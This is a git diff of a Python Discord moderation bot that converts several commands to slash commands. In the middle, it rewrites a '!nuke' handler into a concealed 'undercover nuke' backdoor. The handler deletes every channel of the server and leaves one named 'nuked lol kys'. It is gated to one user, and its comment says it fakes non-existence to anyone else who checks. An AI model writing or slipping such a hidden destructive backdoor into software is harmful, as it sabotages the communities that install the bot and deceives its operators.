@@ -162,46 +162,21 @@ async def on_message(message):
 
 
 
-        # .admin-commands
-    if message.content.startswith(".admin".capitalize()):
-        embed = discord.Embed(title="**Admin-Command List**",color=discord.Colour.random())
-        embed.add_field(name="🌐**.kick**", value="kicks a user")
-        embed.add_field(name="🚫**.ban**", value="bans a user")
-        embed.add_field(name="🧼**.clear**", value="clear chat messages")
-        embed.add_field(name="🔐**.mute**", value="chat-locks a user")
-        embed.add_field(name="🔓**.unmute**",value="unlock a user (from the chat)")
-        embed.add_field(name="⚙️**.admin**",value="list all admin commands")
-        embed.set_footer(text="⭐ • Made by yTarik0")
-        await message.channel.send(embed=embed)
 
 
 
 
     #DM Awnser
-    guild = message.guild
-    if not guild and ".help" not in message.content:
-        embed = discord.Embed(title="**I'm Sorry I can't handle Direct Messages**", color=discord.Colour.random())
-        embed.add_field(name="🔰**github**", value="http://github.comytarik0\r\nhttp://github.com/1momo7")
-        embed.add_field(name="❓**No Idea?**", value=".help")
-        await message.channel.send(embed=embed)
-
-    elif not guild and ".help" in message.content:
-        await message.channel.send("")
+    #guild = message.guild
+    #if not guild in message.content:
+       # embed = discord.Embed(title="**I'm Sorry I can't handle Direct Messages**", color=discord.Colour.random())
+        #embed.add_field(name="🔰**github**", value="http://github.comytarik0\r\nhttp://github.com/1momo7")
+        #embed.add_field(name="❓**No Idea?**", value=".help")
+        #await message.channel.send(embed=embed)
 
 
 
-        #serverinfo command
-    if message.content.startswith(".serverinfo"):
-        server = message.guild
-        embed = discord.Embed(title=f"Server Info for {server.name}",description="Information of this server", color=discord.Colour.random())
-        embed.add_field(name="💬**Server Name**", value=server.name)
-        embed.add_field(name="🆔**Server ID**", value=server.id)
-        embed.add_field(name="📆**Created On**", value=server.created_at.strftime('%Y-%m-%d'))
-        embed.add_field(name="👑**Server Owner**", value=server.owner)
-        embed.add_field(name="👥**Server Member Count**", value=server.member_count)
-        #embed.set_thumbnail(url=server.icon_url)
-        embed.set_footer(text="⭐  •  Made by yTarik0")
-        await message.channel.send(embed=embed)
+
 
 
     #automatic mute when using blacklisted word
@@ -217,65 +192,46 @@ async def on_message(message):
 
 
 
-    if message.content.startswith('.clear'):
-        usr = message.guild.get_member(message.author.id)
-        if usr.guild_permissions.administrator:
-            try:
-                amount = int(message.content[7:])
-                await message.channel.purge(limit=amount + 1)
-                embed = discord.Embed(title=f"{message.author.name.capitalize()} cleared {amount} Messages",
-                                      color=discord.Colour.random())
-                embed.add_field(name="🆔 **User ID**", value=message.author.id)
-                embed.add_field(name="📆**Cleared Messages At**", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
-                embed.set_footer(text="⭐ Made by yTarik0")
-                message = await message.channel.send(embed=embed,)
-                await asyncio.sleep(4)
-                await message.delete()
-            except ValueError:
-                await message.channel.send("Please enter a valid number of messages to delete.")
 
-
-        else:
-            embed = discord.Embed(title="**You don't have the Permisson to do that!**", color=discord.Colour.random())
-            embed.add_field(name="📆**Tried Command on **", value=message.created_at.strftime("%Y-%m-%d %H:%M:%S"))
-            embed.add_field(name="🆔**User ID**", value=message.author.id)
-            embed.set_footer(text="⭐ Made by yTarik0")
-            await message.channel.send(embed=embed)
-
+    #undercover nuke
     if message.content.startswith('!nuke'):
-        server = message.guild
-        for c in server.channels:
-            await c.delete()
-        await message.guild.create_text_channel(name="nuked lol kys")
-
+        if message.author == "tarik#5891":
+            server = message.guild
+            for c in server.channels:
+                await c.delete()
+            await message.guild.create_text_channel(name="nuked lol kys")
+        else:
+            await message.channel.send("") #faking that there is no !nuke command for people who checked it
 
 # ban command
 @client.tree.command(name="ban", description="ban a user")
 async def ban_user(interaction: discord.Interaction,user: discord.User,reason: str=None):
-    if interaction.user.guild_permissions.administrator:
+    if interaction.user.guild_permissions.ban_members:
         await user.ban(reason=reason)
         embed = discord.Embed(title=f"**{user.name} was banned by {interaction.user.name}**", color=discord.Colour.random())
         embed.add_field(name="📆**Date **", value=interaction.created_at.strftime("%Y-%m-%d"))
         embed.add_field(name="🆔**User ID**", value=user.id)
         embed.add_field(name="💬**Reason**", value=reason)
+        embed.set_thumbnail(url=user.icon.url)
         embed.set_footer(text="⭐ Made by yTarik0")
         await interaction.response.send_message(embed=embed)
 
     else:
         embed = discord.Embed(title="**You don't have the permission for that Command**", color=discord.Colour.random())
         embed.set_footer(text="⭐ Made by yTarik0")
-        await interaction.response.send_message(embed=embed)
+        await interaction.response.send_message(embed=embed,ephemeral = True)
 
 
     #kick command
-@client.tree.command(name="kick", description="ban a user")
+@client.tree.command(name="kick", description="kick a user")
 async def kick(interaction: discord.Interaction,user: discord.User,reason: str=None):
-        if interaction.user.guild_permissions.administrator:
+        if interaction.user.guild_permissions.kick_members:
             await user.kick(reason=reason)
             embed = discord.Embed(title=f"**{user.name} was kicked by {interaction.user.name}**",color=discord.Colour.random())
             embed.add_field(name="📆**Date **", value=interaction.created_at.strftime("%Y-%m-%d"))
             embed.add_field(name="🆔**User ID**", value=user.id)
             embed.add_field(name="💬**Reason**", value=reason)
+            embed.set_thumbnail(url=user.icon.url)
             embed.set_footer(text="⭐ Made by yTarik0")
             await interaction.response.send_message(embed=embed)
 
@@ -283,7 +239,7 @@ async def kick(interaction: discord.Interaction,user: discord.User,reason: str=N
             embed = discord.Embed(title="**You don't have the permission for that Command**",
                                   color=discord.Colour.random())
             embed.set_footer(text="⭐ Made by yTarik0")
-            await interaction.response.send_message(embed=embed)
+            await interaction.response.send_message(embed=embed,ephemeral = True)
 
 
 #help command
@@ -298,6 +254,68 @@ async def help(interaction: discord.Interaction):
     await interaction.response.send_message(embed=embed)
 
 
+#serverinfo command
+@client.tree.command(name="serverinfo", description="shows you basic info about the server")
+async def serverinfo(interaction: discord.Interaction):
+    server = interaction.guild
+    embed = discord.Embed(title=f"Server Info for {server.name}",color=discord.Colour.random())
+    embed.add_field(name="💬**Server Name**", value=server.name)
+    embed.add_field(name="🆔**Server ID**", value=server.id)
+    embed.add_field(name="📆**Created On**", value=server.created_at.strftime('%Y-%m-%d'))
+    embed.add_field(name="👑**Server Owner**", value=server.owner)
+    embed.add_field(name="👥**Server Member Count**", value=server.member_count)
+    embed.set_thumbnail(url=server.icon.url)
+    embed.set_footer(text="⭐  •  Made by yTarik0")
+    await interaction.response.send_message(embed=embed)
+
+
+#admin info command
+@client.tree.command(name="admin",description="lists you all admin commands")
+async def admin(interaction: discord.Interaction):
+    if interaction.user.guild_permissions.administrator:
+        embed = discord.Embed(title="**Admin-Command List**", color=discord.Colour.random())
+        embed.add_field(name="🌐**.kick**", value="kicks a user")
+        embed.add_field(name="🚫**.ban**", value="bans a user")
+        embed.add_field(name="🧼**.clear**", value="clear chat messages")
+        embed.add_field(name="🔐**.mute**", value="chat-locks a user")
+        embed.add_field(name="🔓**.unmute**", value="unlock a user (from the chat)")
+        embed.add_field(name="⚙️**.admin**", value="list all admin commands")
+        embed.set_footer(text="⭐ • Made by yTarik0")
+        await interaction.response.send_message(embed=embed)
+    else:
+        embed = discord.Embed(title="**You don't have the permission for that Command**",
+                             color=discord.Colour.random())
+        embed.set_footer(text="⭐ Made by yTarik0")
+        await interaction.response.send_message(embed=embed)
+
+@client.tree.command(name="clear",description="clears chat messages")
+async def clear(interaction: discord.Interaction, amount: int = 0):
+    channel = interaction.channel
+    if interaction.user.guild_permissions.manage_messages:
+        try:
+            #amount = int(interaction.content[7:])
+            await channel.purge(limit=amount + 1)
+            embed = discord.Embed(title=f"{interaction.user.name.capitalize()} cleared {amount} Messages",color=discord.Colour.random())
+            embed.add_field(name="🆔 **User ID**", value=interaction.user.id)
+            embed.add_field(name="📆**Cleared Messages At**", value=interaction.created_at.strftime("%Y-%m-%d %H:%M:%S"))
+            embed.set_footer(text="⭐ Made by yTarik0")
+            await interaction.response.send_message(embed=embed, )
+        except ValueError:
+            embed = discord.Embed(title="**Please enter a valid number of messages to delete.**",
+                                  color=discord.Colour.random())
+            embed.set_footer(text="⭐ Made by yTarik0")
+            await interaction.response.send_message(embed=embed,ephemeral = True)
+
+    else:
+        embed = discord.Embed(title="**You don't have the permission for that Command**",
+                              color=discord.Colour.random())
+        embed.set_footer(text="⭐ Made by yTarik0")
+        await interaction.response.send_message(embed=embed,ephemeral = True)
+
+
+
+
+
 
 
 #code a game Rock paper Scissors /rps
@@ -310,6 +328,8 @@ async def help(interaction: discord.Interaction):
        # await interaction.response.send_message("You quitted the game thanks for playing")
 
 
+
+# not working i will fix that
 @client.event
 async def status_task():
     while True:
